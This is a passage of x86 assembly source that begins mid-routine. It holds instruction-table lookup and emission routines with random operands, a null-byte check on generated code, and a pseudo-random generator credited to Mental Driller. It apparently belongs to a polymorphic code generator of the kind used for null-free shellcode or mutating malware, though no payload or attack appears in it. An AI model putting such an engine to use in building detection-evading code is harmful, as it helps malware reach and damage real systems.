		dec	esi

seek_loop:	inc	esi
		cmp	byte ptr [esi],END_TR
		jne	seek_loop

		inc	ebx
		cmp	ebx,eax
		jne	seek_loop

		inc	esi

variant_found:	
		mov	[esp+PUSHA_STRUCT._ESI],esi
		popad
		ret



; ----------------------------------------------------------------------
; seeks and stores selected instruction
; ----------------------------------------------------------------------
; EAX = number of instruction
; EDI = buffor
; EBX = if -1 -> random operand

seek_and_store_i:
		pushad
		mov	bl,al
		xor	eax,eax
		mov	al,bl

		lea	esi,i_table
		mov	ecx,4
		mul	ecx

		add	esi,eax
		call	gen_instruction
		mov	[esp+PUSHA_STRUCT._EAX],eax
		mov	[esp+PUSHA_STRUCT._EDI],edi

		popad
		ret


















; ESI = buffor
; ECX = size
check_for_null:	pushad
null_loop:	lodsb
		test 	al,al
		jz 	found_null
		loop	null_loop
		popad
		ret
found_null:	@debug "Found null char:|",MB_ICONERROR
		jmp	exit

		
; ----------------------------------------------------------------
; pseudo random number generator by Mental Driller 
; no linear number generation
; ----------------------------------------------------------------


random_eax:
		pushad
		xchg	ecx,eax
		call	random
		xor	edx,edx
		div	ecx
		mov	[esp+PUSHA_STRUCT._EAX],edx
		popad
		ret
	

random_setup:
		push	offset systime
		@callx	GetSystemTime
		_RDTSC
		mov	[DwordAleatorio1],eax
		xor     eax, [DwordAleatorio2]
		mov     [DwordAleatorio3], eax  
		ret


random:
     	 	push    ecx                             		; Save register
     		mov     eax, [DwordAleatorio1]       			; Get 1st seed
    		dec     dword ptr [DwordAleatorio1]  			; Decrease to avoid linearity
    	    	xor     eax, [DwordAleatorio2]       			; XOR with 2nd seed
    	    	mov     ecx, eax                         		; Result in CL
    	   	rol     dword ptr [DwordAleatorio1], cl 		; ROL the 1st seed CL
    	                                                		; times (random)
                add     [DwordAleatorio1], eax    			; Add (1st XOR 2nd) to 1st
                adc     eax, [DwordAleatorio2] 				; Add the 2nd seed to (1st XOR 2nd)
                                           			        ; with CF (random CF at the moment)
                add     eax, ecx        				; EAX=(1st XOR 2nd)+2nd+CF
                ror     eax, cl         				; EAX=EAX ROL (byte)(1st XOR 2nd)
                not     eax             				; NOT (this breaks a possible proximity)
                sub     eax, 3          				; Subtract odd constant (break the linearity)
                xor     [DwordAleatorio2], eax	 			; Modify 2nd seed
                xor     eax, [DwordAleatorio3] 				; XOR 3rd seed with the until-this-
                                           			        ; moment result
                rol     dword ptr [DwordAleatorio3], 1  		; Modify 3rd seed (ROL)...
                sub     dword ptr [DwordAleatorio3], ecx 		; ...and with a 1st/2nd
                                                     		        ; seed dependant variable
                sbb     dword ptr [DwordAleatorio3], 4 			; Subtract a constant value
                                                  		        ; that could be 4 or 5
                inc     dword ptr [DwordAleatorio2] 			; Break linearity on 2nd seed
                pop     ecx                     			; Restore register
                ret                             			; Return


systime:

		dd	0	   ; Year/Month
		dd	0	   ; DayOfWeek/Day
DwordAleatorio1 dd      12345678h  ; wHour/wMinute
DwordAleatorio2 dd      9ABCDEF0h  ; wSecond/wMiliseconds
DwordAleatorio3 dd      97654321h



PUSHA_STRUCT 			STRUCT 
		_EDI     DWORD ?
		_ESI     DWORD ?
		_EBP     DWORD ?
		_ESP     DWORD ?
		_EBX     DWORD ?
		_EDX     DWORD ?
		_ECX     DWORD ?
		_EAX     DWORD ?
PUSHA_STRUCT 			ENDS





end	start